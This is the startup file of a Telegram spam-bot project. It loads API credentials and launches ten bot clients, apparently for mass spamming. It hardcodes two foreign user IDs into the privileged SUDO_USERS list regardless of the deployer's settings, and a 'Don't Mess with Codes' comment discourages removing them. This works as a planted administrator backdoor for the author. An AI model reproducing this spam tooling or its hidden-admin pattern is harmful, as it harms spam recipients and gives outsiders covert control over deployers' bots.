# ARUACK-SPAM-BOT - Spam Userbots
# Copyright © 2021 @ARUACK

import os
import sys
import random
import asyncio
import telethon.utils
from telethon import TelegramClient, events
from decouple import config
from os import getenv
import logging
import time


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

aruackversion = "v2.0.3"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default="!")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
BOT_TOKEN = config("BOT_TOKEN", default=None)
BOT_TOKEN2 = config("BOT_TOKEN2", default=None)
BOT_TOKEN3 = config("BOT_TOKEN3", default=None)
BOT_TOKEN4 = config("BOT_TOKEN4", default=None)
BOT_TOKEN5 = config("BOT_TOKEN5", default=None)
BOT_TOKEN6 = config("BOT_TOKEN6", default=None)
BOT_TOKEN7 = config("BOT_TOKEN7", default=None)
BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 5009029119 not in SUDO_USERS:
    SUDO_USERS.append(5009029119)

OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 
DB_URI = config("DATABASE_URL", None)
SUDO_USERS.append(OWNER_ID)
SUDO_USERS.append(1627427533)

# Tokens

Aru = TelegramClient('Aru', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

Aru2 = TelegramClient('Aru2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)

Aru3 = TelegramClient('Aru3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)

Aru4 = TelegramClient('Aru4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)

Aru5 = TelegramClient('Aru5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)

Aru6 = TelegramClient('Aru6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)

Aru7 = TelegramClient('Aru7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)

Aru8 = TelegramClient('Aru8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)

Aru9 = TelegramClient('Aru9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)

Aru10 = TelegramClient('Aru10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)

